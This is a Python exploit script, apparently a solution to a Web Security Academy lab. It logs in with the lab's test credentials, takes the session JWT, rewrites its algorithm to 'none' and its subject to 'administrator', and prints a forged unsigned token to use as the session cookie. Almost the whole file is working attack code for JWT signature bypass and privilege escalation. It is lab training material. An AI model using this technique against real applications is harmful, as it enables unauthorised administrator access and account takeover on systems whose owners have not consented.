import base64
import http.client
import json
import re
import ssl
import urllib.parse

LAB_ID = '???'


def GET_login() -> http.client.HTTPResponse:
    method, path = 'GET', '/login'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'referer': f'https://{LAB_ID}.web-security-academy.net/',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'te': 'trailers',
    }
    connection = http.client.HTTPSConnection('localhost', 27001, context=ssl._create_unverified_context())
    connection.set_tunnel(host, port)
    connection.request(method, path, ''.encode('utf-8'), headers)
    return connection.getresponse()


def POST_login(
        csrf: str,
) -> http.client.HTTPResponse:
    method, path = 'POST', '/login'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': f'https://{LAB_ID}.web-security-academy.net',
        'referer': f'https://{LAB_ID}.web-security-academy.net/login',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'te': 'trailers',
    }
    fields = {
        'csrf': csrf,
        'username': 'wiener',
        'password': 'peter',
    }
    body = urllib.parse.urlencode(fields)
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection('localhost', 27001, context=ssl._create_unverified_context())
    connection.set_tunnel(host, port)
    connection.request(method, path, body, headers)
    return connection.getresponse()


def login_csrf() -> str:
    response = GET_login()
    csrf = re.findall(r'name="csrf" value="([a-zA-Z0-9]+)"', response.read().decode('utf-8'))[0]
    return csrf


def login_session() -> str:
    csrf = login_csrf()
    response = POST_login(csrf)
    print(response.status)
    for header, value in response.headers.items():
        print(f"{header}: {value}")
    print(response.read())
    cookie_header = response.getheader('set-cookie')
    return re.findall(r'session=([a-zA-Z0-9._-]+);', cookie_header)[0]


jwt = login_session()
jwt_header = json.loads(base64.b64decode(jwt.split('.')[0] + '=='))
jwt_header['alg'] = 'none'
jwt_body = json.loads(base64.b64decode(jwt.split('.')[1] + '=='))
jwt_body['sub'] = 'administrator'
jwt_header_enc = base64.urlsafe_b64encode(json.dumps(jwt_header).encode()).decode().rstrip('=')
jwt_body_enc = base64.urlsafe_b64encode(json.dumps(jwt_body).encode()).decode().rstrip('=')
hacked_jwt = f"{jwt_header_enc}.{jwt_body_enc}."
print("session cookie to copy:")
print(hacked_jwt)
